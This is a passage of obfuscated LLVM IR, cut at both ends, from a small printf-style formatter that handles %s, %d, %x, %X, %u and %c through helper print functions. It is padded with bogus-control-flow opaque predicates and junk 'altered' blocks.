  %111 = icmp eq i32 %110, 0
  %112 = icmp slt i32 %107, 10
  %113 = or i1 %111, %112
  br i1 %113, label %originalBBpart212, label %originalBB10alteredBB

originalBBpart212:                                ; preds = %originalBB10
  br i1 %105, label %114, label %119

; <label>:114:                                    ; preds = %originalBBpart212
  %115 = load i8*, i8** %5, align 8
  %116 = getelementptr inbounds i8, i8* %115, i32 1
  store i8* %116, i8** %5, align 8
  %117 = load i32, i32* %8, align 4
  %118 = or i32 %117, 2
  store i32 %118, i32* %8, align 4
  br label %93

; <label>:119:                                    ; preds = %originalBBpart212
  br label %120

; <label>:120:                                    ; preds = %157, %119
  %121 = load i32, i32* @x.11
  %122 = load i32, i32* @y.12
  %123 = sub i32 %121, 1
  %124 = mul i32 %121, %123
  %125 = urem i32 %124, 2
  %126 = icmp eq i32 %125, 0
  %127 = icmp slt i32 %122, 10
  %128 = or i1 %126, %127
  br i1 %128, label %originalBB14, label %originalBB14alteredBB

originalBB14:                                     ; preds = %originalBB14alteredBB, %120
  %129 = load i8*, i8** %5, align 8
  %130 = load i8, i8* %129, align 1
  %131 = zext i8 %130 to i32
  %132 = icmp sge i32 %131, 48
  %133 = load i32, i32* @x.11
  %134 = load i32, i32* @y.12
  %135 = sub i32 %133, 1
  %136 = mul i32 %133, %135
  %137 = urem i32 %136, 2
  %138 = icmp eq i32 %137, 0
  %139 = icmp slt i32 %134, 10
  %140 = or i1 %138, %139
  br i1 %140, label %originalBBpart216, label %originalBB14alteredBB

originalBBpart216:                                ; preds = %originalBB14
  br i1 %132, label %141, label %146

; <label>:141:                                    ; preds = %originalBBpart216
  %142 = load i8*, i8** %5, align 8
  %143 = load i8, i8* %142, align 1
  %144 = zext i8 %143 to i32
  %145 = icmp sle i32 %144, 57
  br label %146

; <label>:146:                                    ; preds = %141, %originalBBpart216
  %147 = phi i1 [ false, %originalBBpart216 ], [ %145, %141 ]
  br i1 %147, label %148, label %160

; <label>:148:                                    ; preds = %146
  %149 = load i32, i32* %7, align 4
  %150 = mul nsw i32 %149, 10
  store i32 %150, i32* %7, align 4
  %151 = load i8*, i8** %5, align 8
  %152 = load i8, i8* %151, align 1
  %153 = zext i8 %152 to i32
  %154 = sub nsw i32 %153, 48
  %155 = load i32, i32* %7, align 4
  %156 = add nsw i32 %155, %154
  store i32 %156, i32* %7, align 4
  br label %157

; <label>:157:                                    ; preds = %148
  %158 = load i8*, i8** %5, align 8
  %159 = getelementptr inbounds i8, i8* %158, i32 1
  store i8* %159, i8** %5, align 8
  br label %120

; <label>:160:                                    ; preds = %146
  %161 = load i8*, i8** %5, align 8
  %162 = load i8, i8* %161, align 1
  %163 = zext i8 %162 to i32
  %164 = icmp eq i32 %163, 115
  br i1 %164, label %165, label %231

; <label>:165:                                    ; preds = %160
  %166 = load i32, i32* @x.11
  %167 = load i32, i32* @y.12
  %168 = sub i32 %166, 1
  %169 = mul i32 %166, %168
  %170 = urem i32 %169, 2
  %171 = icmp eq i32 %170, 0
  %172 = icmp slt i32 %167, 10
  %173 = or i1 %171, %172
  br i1 %173, label %originalBB18, label %originalBB18alteredBB

originalBB18:                                     ; preds = %originalBB18alteredBB, %165
  %174 = load %struct.__va_list_tag*, %struct.__va_list_tag** %6, align 8
  %175 = getelementptr inbounds %struct.__va_list_tag, %struct.__va_list_tag* %174, i32 0, i32 0
  %176 = load i32, i32* %175, align 8
  %177 = icmp ule i32 %176, 40
  %178 = load i32, i32* @x.11
  %179 = load i32, i32* @y.12
  %180 = sub i32 %178, 1
  %181 = mul i32 %178, %180
  %182 = urem i32 %181, 2
  %183 = icmp eq i32 %182, 0
  %184 = icmp slt i32 %179, 10
  %185 = or i1 %183, %184
  br i1 %185, label %originalBBpart220, label %originalBB18alteredBB

originalBBpart220:                                ; preds = %originalBB18
  br i1 %177, label %186, label %192

; <label>:186:                                    ; preds = %originalBBpart220
  %187 = getelementptr inbounds %struct.__va_list_tag, %struct.__va_list_tag* %174, i32 0, i32 3
  %188 = load i8*, i8** %187, align 8
  %189 = getelementptr i8, i8* %188, i32 %176
  %190 = bitcast i8* %189 to i32*
  %191 = add i32 %176, 8
  store i32 %191, i32* %175, align 8
  br label %197

; <label>:192:                                    ; preds = %originalBBpart220
  %193 = getelementptr inbounds %struct.__va_list_tag, %struct.__va_list_tag* %174, i32 0, i32 2
  %194 = load i8*, i8** %193, align 8
  %195 = bitcast i8* %194 to i32*
  %196 = getelementptr i8, i8* %194, i32 8
  store i8* %196, i8** %193, align 8
  br label %197

; <label>:197:                                    ; preds = %192, %186
  %198 = phi i32* [ %190, %186 ], [ %195, %192 ]
  %199 = load i32, i32* %198, align 4
  %200 = sext i32 %199 to i64
  %201 = inttoptr i64 %200 to i8*
  store i8* %201, i8** %11, align 8
  %202 = load i8**, i8*** %4, align 8
  %203 = load i8*, i8** %11, align 8
  %204 = icmp ne i8* %203, null
  br i1 %204, label %205, label %207

; <label>:205:                                    ; preds = %197
  %206 = load i8*, i8** %11, align 8
  br label %208

; <label>:207:                                    ; preds = %197
  br label %208

; <label>:208:                                    ; preds = %207, %205
  %209 = phi i8* [ %206, %205 ], [ getelementptr inbounds ([7 x i8], [7 x i8]* @.str.500, i32 0, i32 0), %207 ]
  %210 = load i32, i32* @x.11
  %211 = load i32, i32* @y.12
  %212 = sub i32 %210, 1
  %213 = mul i32 %210, %212
  %214 = urem i32 %213, 2
  %215 = icmp eq i32 %214, 0
  %216 = icmp slt i32 %211, 10
  %217 = or i1 %215, %216
  br i1 %217, label %originalBB22, label %originalBB22alteredBB

originalBB22:                                     ; preds = %originalBB22alteredBB, %208
  %218 = load i32, i32* %7, align 4
  %219 = load i32, i32* %8, align 4
  %220 = call i32 @prints(i8** %202, i8* %209, i32 %218, i32 %219)
  %221 = load i32, i32* %9, align 4
  %222 = add nsw i32 %221, %220
  store i32 %222, i32* %9, align 4
  %223 = load i32, i32* @x.11
  %224 = load i32, i32* @y.12
  %225 = sub i32 %223, 1
  %226 = mul i32 %223, %225
  %227 = urem i32 %226, 2
  %228 = icmp eq i32 %227, 0
  %229 = icmp slt i32 %224, 10
  %230 = or i1 %228, %229
  br i1 %230, label %originalBBpart227, label %originalBB22alteredBB

originalBBpart227:                                ; preds = %originalBB22
  br label %603

; <label>:231:                                    ; preds = %160
  %232 = load i32, i32* @x.11
  %233 = load i32, i32* @y.12
  %234 = sub i32 %232, 1
  %235 = mul i32 %232, %234
  %236 = urem i32 %235, 2
  %237 = icmp eq i32 %236, 0
  %238 = icmp slt i32 %233, 10
  %239 = or i1 %237, %238
  br i1 %239, label %originalBB29, label %originalBB29alteredBB

originalBB29:                                     ; preds = %originalBB29alteredBB, %231
  %240 = load i8*, i8** %5, align 8
  %241 = load i8, i8* %240, align 1
  %242 = zext i8 %241 to i32
  %243 = icmp eq i32 %242, 100
  %244 = load i32, i32* @x.11
  %245 = load i32, i32* @y.12
  %246 = sub i32 %244, 1
  %247 = mul i32 %244, %246
  %248 = urem i32 %247, 2
  %249 = icmp eq i32 %248, 0
  %250 = icmp slt i32 %245, 10
  %251 = or i1 %249, %250
  br i1 %251, label %originalBBpart231, label %originalBB29alteredBB

originalBBpart231:                                ; preds = %originalBB29
  br i1 %243, label %252, label %309

; <label>:252:                                    ; preds = %originalBBpart231
  %253 = load i8**, i8*** %4, align 8
  %254 = load %struct.__va_list_tag*, %struct.__va_list_tag** %6, align 8
  %255 = getelementptr inbounds %struct.__va_list_tag, %struct.__va_list_tag* %254, i32 0, i32 0
  %256 = load i32, i32* %255, align 8
  %257 = icmp ule i32 %256, 40
  br i1 %257, label %258, label %280

; <label>:258:                                    ; preds = %252
  %259 = load i32, i32* @x.11
  %260 = load i32, i32* @y.12
  %261 = sub i32 %259, 1
  %262 = mul i32 %259, %261
  %263 = urem i32 %262, 2
  %264 = icmp eq i32 %263, 0
  %265 = icmp slt i32 %260, 10
  %266 = or i1 %264, %265
  br i1 %266, label %originalBB33, label %originalBB33alteredBB

originalBB33:                                     ; preds = %originalBB33alteredBB, %258
  %267 = getelementptr inbounds %struct.__va_list_tag, %struct.__va_list_tag* %254, i32 0, i32 3
  %268 = load i8*, i8** %267, align 8
  %269 = getelementptr i8, i8* %268, i32 %256
  %270 = bitcast i8* %269 to i32*
  %271 = add i32 %256, 8
  store i32 %271, i32* %255, align 8
  %272 = load i32, i32* @x.11
  %273 = load i32, i32* @y.12
  %274 = sub i32 %272, 1
  %275 = mul i32 %272, %274
  %276 = urem i32 %275, 2
  %277 = icmp eq i32 %276, 0
  %278 = icmp slt i32 %273, 10
  %279 = or i1 %277, %278
  br i1 %279, label %originalBBpart247, label %originalBB33alteredBB

originalBBpart247:                                ; preds = %originalBB33
  br label %301

; <label>:280:                                    ; preds = %252
  %281 = load i32, i32* @x.11
  %282 = load i32, i32* @y.12
  %283 = sub i32 %281, 1
  %284 = mul i32 %281, %283
  %285 = urem i32 %284, 2
  %286 = icmp eq i32 %285, 0
  %287 = icmp slt i32 %282, 10
  %288 = or i1 %286, %287
  br i1 %288, label %originalBB49, label %originalBB49alteredBB

originalBB49:                                     ; preds = %originalBB49alteredBB, %280
  %289 = getelementptr inbounds %struct.__va_list_tag, %struct.__va_list_tag* %254, i32 0, i32 2
  %290 = load i8*, i8** %289, align 8
  %291 = bitcast i8* %290 to i32*
  %292 = getelementptr i8, i8* %290, i32 8
  store i8* %292, i8** %289, align 8
  %293 = load i32, i32* @x.11
  %294 = load i32, i32* @y.12
  %295 = sub i32 %293, 1
  %296 = mul i32 %293, %295
  %297 = urem i32 %296, 2
  %298 = icmp eq i32 %297, 0
  %299 = icmp slt i32 %294, 10
  %300 = or i1 %298, %299
  br i1 %300, label %originalBBpart251, label %originalBB49alteredBB

originalBBpart251:                                ; preds = %originalBB49
  br label %301

; <label>:301:                                    ; preds = %originalBBpart251, %originalBBpart247
  %302 = phi i32* [ %270, %originalBBpart247 ], [ %291, %originalBBpart251 ]
  %303 = load i32, i32* %302, align 4
  %304 = load i32, i32* %7, align 4
  %305 = load i32, i32* %8, align 4
  %306 = call i32 @printi(i8** %253, i32 %303, i32 10, i32 1, i32 %304, i32 %305, i32 97)
  %307 = load i32, i32* %9, align 4
  %308 = add nsw i32 %307, %306
  store i32 %308, i32* %9, align 4
  br label %603

; <label>:309:                                    ; preds = %originalBBpart231
  %310 = load i32, i32* @x.11
  %311 = load i32, i32* @y.12
  %312 = sub i32 %310, 1
  %313 = mul i32 %310, %312
  %314 = urem i32 %313, 2
  %315 = icmp eq i32 %314, 0
  %316 = icmp slt i32 %311, 10
  %317 = or i1 %315, %316
  br i1 %317, label %originalBB53, label %originalBB53alteredBB

originalBB53:                                     ; preds = %originalBB53alteredBB, %309
  %318 = load i8*, i8** %5, align 8
  %319 = load i8, i8* %318, align 1
  %320 = zext i8 %319 to i32
  %321 = icmp eq i32 %320, 120
  %322 = load i32, i32* @x.11
  %323 = load i32, i32* @y.12
  %324 = sub i32 %322, 1
  %325 = mul i32 %322, %324
  %326 = urem i32 %325, 2
  %327 = icmp eq i32 %326, 0
  %328 = icmp slt i32 %323, 10
  %329 = or i1 %327, %328
  br i1 %329, label %originalBBpart255, label %originalBB53alteredBB

originalBBpart255:                                ; preds = %originalBB53
  br i1 %321, label %330, label %371

; <label>:330:                                    ; preds = %originalBBpart255
  %331 = load i32, i32* @x.11
  %332 = load i32, i32* @y.12
  %333 = sub i32 %331, 1
  %334 = mul i32 %331, %333
  %335 = urem i32 %334, 2
  %336 = icmp eq i32 %335, 0
  %337 = icmp slt i32 %332, 10
  %338 = or i1 %336, %337
  br i1 %338, label %originalBB57, label %originalBB57alteredBB

originalBB57:                                     ; preds = %originalBB57alteredBB, %330
  %339 = load i8**, i8*** %4, align 8
  %340 = load %struct.__va_list_tag*, %struct.__va_list_tag** %6, align 8
  %341 = getelementptr inbounds %struct.__va_list_tag, %struct.__va_list_tag* %340, i32 0, i32 0
  %342 = load i32, i32* %341, align 8
  %343 = icmp ule i32 %342, 40
  %344 = load i32, i32* @x.11
  %345 = load i32, i32* @y.12
  %346 = sub i32 %344, 1
  %347 = mul i32 %344, %346
  %348 = urem i32 %347, 2
  %349 = icmp eq i32 %348, 0
  %350 = icmp slt i32 %345, 10
  %351 = or i1 %349, %350
  br i1 %351, label %originalBBpart259, label %originalBB57alteredBB

originalBBpart259:                                ; preds = %originalBB57
  br i1 %343, label %352, label %358

; <label>:352:                                    ; preds = %originalBBpart259
  %353 = getelementptr inbounds %struct.__va_list_tag, %struct.__va_list_tag* %340, i32 0, i32 3
  %354 = load i8*, i8** %353, align 8
  %355 = getelementptr i8, i8* %354, i32 %342
  %356 = bitcast i8* %355 to i32*
  %357 = add i32 %342, 8
  store i32 %357, i32* %341, align 8
  br label %363

; <label>:358:                                    ; preds = %originalBBpart259
  %359 = getelementptr inbounds %struct.__va_list_tag, %struct.__va_list_tag* %340, i32 0, i32 2
  %360 = load i8*, i8** %359, align 8
  %361 = bitcast i8* %360 to i32*
  %362 = getelementptr i8, i8* %360, i32 8
  store i8* %362, i8** %359, align 8
  br label %363

; <label>:363:                                    ; preds = %358, %352
  %364 = phi i32* [ %356, %352 ], [ %361, %358 ]
  %365 = load i32, i32* %364, align 4
  %366 = load i32, i32* %7, align 4
  %367 = load i32, i32* %8, align 4
  %368 = call i32 @printi(i8** %339, i32 %365, i32 16, i32 0, i32 %366, i32 %367, i32 97)
  %369 = load i32, i32* %9, align 4
  %370 = add nsw i32 %369, %368
  store i32 %370, i32* %9, align 4
  br label %603

; <label>:371:                                    ; preds = %originalBBpart255
  %372 = load i8*, i8** %5, align 8
  %373 = load i8, i8* %372, align 1
  %374 = zext i8 %373 to i32
  %375 = icmp eq i32 %374, 88
  br i1 %375, label %376, label %401

; <label>:376:                                    ; preds = %371
  %377 = load i8**, i8*** %4, align 8
  %378 = load %struct.__va_list_tag*, %struct.__va_list_tag** %6, align 8
  %379 = getelementptr inbounds %struct.__va_list_tag, %struct.__va_list_tag* %378, i32 0, i32 0
  %380 = load i32, i32* %379, align 8
  %381 = icmp ule i32 %380, 40
  br i1 %381, label %382, label %388

; <label>:382:                                    ; preds = %376
  %383 = getelementptr inbounds %struct.__va_list_tag, %struct.__va_list_tag* %378, i32 0, i32 3
  %384 = load i8*, i8** %383, align 8
  %385 = getelementptr i8, i8* %384, i32 %380
  %386 = bitcast i8* %385 to i32*
  %387 = add i32 %380, 8
  store i32 %387, i32* %379, align 8
  br label %393

; <label>:388:                                    ; preds = %376
  %389 = getelementptr inbounds %struct.__va_list_tag, %struct.__va_list_tag* %378, i32 0, i32 2
  %390 = load i8*, i8** %389, align 8
  %391 = bitcast i8* %390 to i32*
  %392 = getelementptr i8, i8* %390, i32 8
  store i8* %392, i8** %389, align 8
  br label %393

; <label>:393:                                    ; preds = %388, %382
  %394 = phi i32* [ %386, %382 ], [ %391, %388 ]
  %395 = load i32, i32* %394, align 4
  %396 = load i32, i32* %7, align 4
  %397 = load i32, i32* %8, align 4
  %398 = call i32 @printi(i8** %377, i32 %395, i32 16, i32 0, i32 %396, i32 %397, i32 65)
  %399 = load i32, i32* %9, align 4
  %400 = add nsw i32 %399, %398
  store i32 %400, i32* %9, align 4
  br label %603

; <label>:401:                                    ; preds = %371
  %402 = load i32, i32* @x.11
  %403 = load i32, i32* @y.12
  %404 = sub i32 %402, 1
  %405 = mul i32 %402, %404
  %406 = urem i32 %405, 2
  %407 = icmp eq i32 %406, 0
  %408 = icmp slt i32 %403, 10
  %409 = or i1 %407, %408
  br i1 %409, label %originalBB61, label %originalBB61alteredBB

originalBB61:                                     ; preds = %originalBB61alteredBB, %401
  %410 = load i8*, i8** %5, align 8
  %411 = load i8, i8* %410, align 1
  %412 = zext i8 %411 to i32
  %413 = icmp eq i32 %412, 117
  %414 = load i32, i32* @x.11
  %415 = load i32, i32* @y.12
  %416 = sub i32 %414, 1
  %417 = mul i32 %414, %416
  %418 = urem i32 %417, 2
  %419 = icmp eq i32 %418, 0
  %420 = icmp slt i32 %415, 10
  %421 = or i1 %419, %420
  br i1 %421, label %originalBBpart263, label %originalBB61alteredBB

originalBBpart263:                                ; preds = %originalBB61
  br i1 %413, label %422, label %463

; <label>:422:                                    ; preds = %originalBBpart263
  %423 = load i8**, i8*** %4, align 8
  %424 = load %struct.__va_list_tag*, %struct.__va_list_tag** %6, align 8
  %425 = getelementptr inbounds %struct.__va_list_tag, %struct.__va_list_tag* %424, i32 0, i32 0
  %426 = load i32, i32* %425, align 8
  %427 = icmp ule i32 %426, 40
  br i1 %427, label %428, label %450

; <label>:428:                                    ; preds = %422
  %429 = load i32, i32* @x.11
  %430 = load i32, i32* @y.12
  %431 = sub i32 %429, 1
  %432 = mul i32 %429, %431
  %433 = urem i32 %432, 2
  %434 = icmp eq i32 %433, 0
  %435 = icmp slt i32 %430, 10
  %436 = or i1 %434, %435
  br i1 %436, label %originalBB65, label %originalBB65alteredBB

originalBB65:                                     ; preds = %originalBB65alteredBB, %428
  %437 = getelementptr inbounds %struct.__va_list_tag, %struct.__va_list_tag* %424, i32 0, i32 3
  %438 = load i8*, i8** %437, align 8
  %439 = getelementptr i8, i8* %438, i32 %426
  %440 = bitcast i8* %439 to i32*
  %441 = add i32 %426, 8
  store i32 %441, i32* %425, align 8
  %442 = load i32, i32* @x.11
  %443 = load i32, i32* @y.12
  %444 = sub i32 %442, 1
  %445 = mul i32 %442, %444
  %446 = urem i32 %445, 2
  %447 = icmp eq i32 %446, 0
  %448 = icmp slt i32 %443, 10
  %449 = or i1 %447, %448
  br i1 %449, label %originalBBpart267, label %originalBB65alteredBB

originalBBpart267:                                ; preds = %originalBB65
  br label %455

; <label>:450:                                    ; preds = %422
  %451 = getelementptr inbounds %struct.__va_list_tag, %struct.__va_list_tag* %424, i32 0, i32 2
  %452 = load i8*, i8** %451, align 8
  %453 = bitcast i8* %452 to i32*
  %454 = getelementptr i8, i8* %452, i32 8
  store i8* %454, i8** %451, align 8
  br label %455

; <label>:455:                                    ; preds = %450, %originalBBpart267
  %456 = phi i32* [ %440, %originalBBpart267 ], [ %453, %450 ]
  %457 = load i32, i32* %456, align 4
  %458 = load i32, i32* %7, align 4
  %459 = load i32, i32* %8, align 4
  %460 = call i32 @printi(i8** %423, i32 %457, i32 10, i32 0, i32 %458, i32 %459, i32 97)
  %461 = load i32, i32* %9, align 4
  %462 = add nsw i32 %461, %460
  store i32 %462, i32* %9, align 4
  br label %603

; <label>:463:                                    ; preds = %originalBBpart263
  %464 = load i8*, i8** %5, align 8
  %465 = load i8, i8* %464, align 1
  %466 = zext i8 %465 to i32
  %467 = icmp eq i32 %466, 99
  br i1 %467, label %468, label %545

; <label>:468:                                    ; preds = %463
  %469 = load i32, i32* @x.11
  %470 = load i32, i32* @y.12
  %471 = sub i32 %469, 1
  %472 = mul i32 %469, %471
  %473 = urem i32 %472, 2
  %474 = icmp eq i32 %473, 0
  %475 = icmp slt i32 %470, 10
  %476 = or i1 %474, %475
  br i1 %476, label %originalBB69, label %originalBB69alteredBB

originalBB69:                                     ; preds = %originalBB69alteredBB, %468
  %477 = load %struct.__va_list_tag*, %struct.__va_list_tag** %6, align 8
  %478 = getelementptr inbounds %struct.__va_list_tag, %struct.__va_list_tag* %477, i32 0, i32 0
  %479 = load i32, i32* %478, align 8
  %480 = icmp ule i32 %479, 40
  %481 = load i32, i32* @x.11
  %482 = load i32, i32* @y.12
  %483 = sub i32 %481, 1
  %484 = mul i32 %481, %483
  %485 = urem i32 %484, 2
  %486 = icmp eq i32 %485, 0
  %487 = icmp slt i32 %482, 10
  %488 = or i1 %486, %487
  br i1 %488, label %originalBBpart271, label %originalBB69alteredBB

originalBBpart271:                                ; preds = %originalBB69
  br i1 %480, label %489, label %495

; <label>:489:                                    ; preds = %originalBBpart271
  %490 = getelementptr inbounds %struct.__va_list_tag, %struct.__va_list_tag* %477, i32 0, i32 3
  %491 = load i8*, i8** %490, align 8
  %492 = getelementptr i8, i8* %491, i32 %479
  %493 = bitcast i8* %492 to i32*
  %494 = add i32 %479, 8
  store i32 %494, i32* %478, align 8
  br label %516

; <label>:495:                                    ; preds = %originalBBpart271
  %496 = load i32, i32* @x.11
  %497 = load i32, i32* @y.12
  %498 = sub i32 %496, 1
  %499 = mul i32 %496, %498
  %500 = urem i32 %499, 2
  %501 = icmp eq i32 %500, 0
  %502 = icmp slt i32 %497, 10
  %503 = or i1 %501, %502
  br i1 %503, label %originalBB73, label %originalBB73alteredBB

originalBB73:                                     ; preds = %originalBB73alteredBB, %495
  %504 = getelementptr inbounds %struct.__va_list_tag, %struct.__va_list_tag* %477, i32 0, i32 2
  %505 = load i8*, i8** %504, align 8
  %506 = bitcast i8* %505 to i32*
  %507 = getelementptr i8, i8* %505, i32 8
  store i8* %507, i8** %504, align 8
  %508 = load i32, i32* @x.11
  %509 = load i32, i32* @y.12
  %510 = sub i32 %508, 1
  %511 = mul i32 %508, %510
  %512 = urem i32 %511, 2
  %513 = icmp eq i32 %512, 0
  %514 = icmp slt i32 %509, 10
  %515 = or i1 %513, %514
  br i1 %515, label %originalBBpart275, label %originalBB73alteredBB

originalBBpart275:                                ; preds = %originalBB73
  br label %516

; <label>:516:                                    ; preds = %originalBBpart275, %489
  %517 = phi i32* [ %493, %489 ], [ %506, %originalBBpart275 ]
  %518 = load i32, i32* @x.11
  %519 = load i32, i32* @y.12
  %520 = sub i32 %518, 1
  %521 = mul i32 %518, %520
  %522 = urem i32 %521, 2
  %523 = icmp eq i32 %522, 0
  %524 = icmp slt i32 %519, 10
  %525 = or i1 %523, %524
  br i1 %525, label %originalBB77, label %originalBB77alteredBB

originalBB77:                                     ; preds = %originalBB77alteredBB, %516
  %526 = load i32, i32* %517, align 4
  %527 = trunc i32 %526 to i8
  %528 = getelementptr inbounds [2 x i8], [2 x i8]* %10, i64 0, i64 0
  store i8 %527, i8* %528, align 1
  %529 = getelementptr inbounds [2 x i8], [2 x i8]* %10, i64 0, i64 1
  store i8 0, i8* %529, align 1
  %530 = load i8**, i8*** %4, align 8
  %531 = getelementptr inbounds [2 x i8], [2 x i8]* %10, i32 0, i32 0
  %532 = load i32, i32* %7, align 4
  %533 = load i32, i32* %8, align 4
  %534 = call i32 @prints(i8** %530, i8* %531, i32 %532, i32 %533)
  %535 = load i32, i32* %9, align 4
  %536 = add nsw i32 %535, %534
  store i32 %536, i32* %9, align 4
  %537 = load i32, i32* @x.11
  %538 = load i32, i32* @y.12
  %539 = sub i32 %537, 1
  %540 = mul i32 %537, %539
  %541 = urem i32 %540, 2
  %542 = icmp eq i32 %541, 0
  %543 = icmp slt i32 %538, 10
  %544 = or i1 %542, %543
  br i1 %544, label %originalBBpart284, label %originalBB77alteredBB

originalBBpart284:                                ; preds = %originalBB77
  br label %603

; <label>:545:                                    ; preds = %463
  %546 = load i32, i32* @x.11
  %547 = load i32, i32* @y.12
  %548 = sub i32 %546, 1
  %549 = mul i32 %546, %548
  %550 = urem i32 %549, 2
  %551 = icmp eq i32 %550, 0
  %552 = icmp slt i32 %547, 10
  %553 = or i1 %551, %552
  br i1 %553, label %originalBB86, label %originalBB86alteredBB

originalBB86:                                     ; preds = %originalBB86alteredBB, %545
  %554 = load i32, i32* @x.11
  %555 = load i32, i32* @y.12
  %556 = sub i32 %554, 1
  %557 = mul i32 %554, %556
  %558 = urem i32 %557, 2
  %559 = icmp eq i32 %558, 0
  %560 = icmp slt i32 %555, 10
  %561 = or i1 %559, %560
  br i1 %561, label %originalBBpart288, label %originalBB86alteredBB

originalBBpart288:                                ; preds = %originalBB86
  br label %602

; <label>:562:                                    ; preds = %17
  %563 = load i32, i32* @x.11
  %564 = load i32, i32* @y.12
  %565 = sub i32 %563, 1
  %566 = mul i32 %563, %565
  %567 = urem i32 %566, 2
  %568 = icmp eq i32 %567, 0
  %569 = icmp slt i32 %564, 10
  %570 = or i1 %568, %569
  br i1 %570, label %originalBB90, label %originalBB90alteredBB

originalBB90:                                     ; preds = %originalBB90alteredBB, %562
  %571 = load i32, i32* @x.11
  %572 = load i32, i32* @y.12
  %573 = sub i32 %571, 1
  %574 = mul i32 %571, %573
  %575 = urem i32 %574, 2
  %576 = icmp eq i32 %575, 0
  %577 = icmp slt i32 %572, 10
  %578 = or i1 %576, %577
  br i1 %578, label %originalBBpart292, label %originalBB90alteredBB

originalBBpart292:                                ; preds = %originalBB90
  br label %579

; <label>:579:                                    ; preds = %originalBBpart292, %67
  %580 = load i32, i32* @x.11
  %581 = load i32, i32* @y.12
  %582 = sub i32 %580, 1
  %583 = mul i32 %580, %582
  %584 = urem i32 %583, 2
  %585 = icmp eq i32 %584, 0
  %586 = icmp slt i32 %581, 10
  %587 = or i1 %585, %586
  br i1 %587, label %originalBB94, label %originalBB94alteredBB

originalBB94:                                     ; preds = %originalBB94alteredBB, %579
  %588 = load i8**, i8*** %4, align 8
  %589 = load i8*, i8** %5, align 8
  %590 = load i8, i8* %589, align 1
  %591 = zext i8 %590 to i32
  call void @printchar(i8** %588, i32 %591)
  %592 = load i32, i32* %9, align 4
  %593 = add nsw i32 %592, 1
  store i32 %593, i32* %9, align 4
  %594 = load i32, i32* @x.11
  %595 = load i32, i32* @y.12
  %596 = sub i32 %594, 1
  %597 = mul i32 %594, %596
  %598 = urem i32 %597, 2
  %599 = icmp eq i32 %598, 0
  %600 = icmp slt i32 %595, 10
  %601 = or i1 %599, %600
  br i1 %601, label %originalBBpart2100, label %originalBB94alteredBB

originalBBpart2100:                               ; preds = %originalBB94
  br label %602

; <label>:602:                                    ; preds = %originalBBpart2100, %originalBBpart288
  br label %603

; <label>:603:                                    ; preds = %602, %originalBBpart284, %455, %393, %363, %301, %originalBBpart227
  %604 = load i8*, i8** %5, align 8
  %605 = getelementptr inbounds i8, i8* %604, i32 1
  store i8* %605, i8** %5, align 8
  br label %12

; <label>:606:                                    ; preds = %originalBBpart24, %12
  %607 = load i8**, i8*** %4, align 8
  %608 = icmp ne i8** %607, null
  br i1 %608, label %609, label %628

; <label>:609:                                    ; preds = %606
  %610 = load i32, i32* @x.11
  %611 = load i32, i32* @y.12
  %612 = sub i32 %610, 1
  %613 = mul i32 %610, %612
  %614 = urem i32 %613, 2
  %615 = icmp eq i32 %614, 0
  %616 = icmp slt i32 %611, 10
  %617 = or i1 %615, %616
  br i1 %617, label %originalBB102, label %originalBB102alteredBB

originalBB102:                                    ; preds = %originalBB102alteredBB, %609
  %618 = load i8**, i8*** %4, align 8
  %619 = load i8*, i8** %618, align 8
  store i8 0, i8* %619, align 1
  %620 = load i32, i32* @x.11
  %621 = load i32, i32* @y.12
  %622 = sub i32 %620, 1
  %623 = mul i32 %620, %622
  %624 = urem i32 %623, 2
  %625 = icmp eq i32 %624, 0
  %626 = icmp slt i32 %621, 10
  %627 = or i1 %625, %626
  br i1 %627, label %originalBBpart2104, label %originalBB102alteredBB

originalBBpart2104:                               ; preds = %originalBB102
  br label %628

; <label>:628:                                    ; preds = %originalBBpart2104, %606
  %629 = load %struct.__va_list_tag*, %struct.__va_list_tag** %6, align 8
  %630 = bitcast %struct.__va_list_tag* %629 to i8*
  call void @llvm.va_end(i8* %630)
  %631 = load i32, i32* %9, align 4
  ret i32 %631

originalBBalteredBB:                              ; preds = %originalBB, %22
  %632 = load i8*, i8** %5, align 8
  %633 = getelementptr inbounds i8, i8* %632, i32 1
  store i8* %633, i8** %5, align 8
  store i32 0, i32* %8, align 4
  store i32 0, i32* %7, align 4
  %634 = load i8*, i8** %5, align 8
  %635 = load i8, i8* %634, align 1
  %636 = zext i8 %635 to i32
  %637 = icmp eq i32 %636, 0
  br label %originalBB

originalBB1alteredBB:                             ; preds = %originalBB1, %45
  br label %originalBB1

originalBB6alteredBB:                             ; preds = %originalBB6, %68
  %638 = load i8*, i8** %5, align 8
  %639 = load i8, i8* %638, align 1
  %640 = zext i8 %639 to i32
  %641 = icmp eq i32 %640, 45
  br label %originalBB6

originalBB10alteredBB:                            ; preds = %originalBB10, %93
  %642 = load i8*, i8** %5, align 8
  %643 = load i8, i8* %642, align 1
  %644 = zext i8 %643 to i32
  %645 = icmp eq i32 %644, 48
  br label %originalBB10

originalBB14alteredBB:                            ; preds = %originalBB14, %120
  %646 = load i8*, i8** %5, align 8
  %647 = load i8, i8* %646, align 1
  %648 = zext i8 %647 to i32
  %649 = icmp sge i32 %648, 48
  br label %originalBB14

originalBB18alteredBB:                            ; preds = %originalBB18, %165
  %650 = load %struct.__va_list_tag*, %struct.__va_list_tag** %6, align 8
  %651 = getelementptr inbounds %struct.__va_list_tag, %struct.__va_list_tag* %650, i32 0, i32 0
  %652 = load i32, i32* %651, align 8
  %653 = icmp ule i32 %652, 40
  br label %originalBB18

originalBB22alteredBB:                            ; preds = %originalBB22, %208
  %654 = load i32, i32* %7, align 4
  %655 = load i32, i32* %8, align 4
  %656 = call i32 @prints(i8** %202, i8* %209, i32 %654, i32 %655)
  %657 = load i32, i32* %9, align 4
  %_ = sub i32 %657, %656
  %gen = mul i32 %_, %656
  %_23 = shl i32 %657, %656
  %_24 = sub i32 0, %657
  %gen25 = add i32 %_24, %656
  %658 = add nsw i32 %657, %656
  store i32 %658, i32* %9, align 4
  br label %originalBB22

originalBB29alteredBB:                            ; preds = %originalBB29, %231
  %659 = load i8*, i8** %5, align 8
  %660 = load i8, i8* %659, align 1
  %661 = zext i8 %660 to i32
  %662 = icmp eq i32 %661, 100
  br label %originalBB29

originalBB33alteredBB:                            ; preds = %originalBB33, %258
  %663 = getelementptr inbounds %struct.__va_list_tag, %struct.__va_list_tag* %254, i32 0, i32 3
  %664 = load i8*, i8** %663, align 8
  %665 = getelementptr i8, i8* %664, i32 %256
  %666 = bitcast i8* %665 to i32*
  %_34 = sub i32 0, %256
  %gen35 = add i32 %_34, 8
  %_36 = sub i32 %256, 8
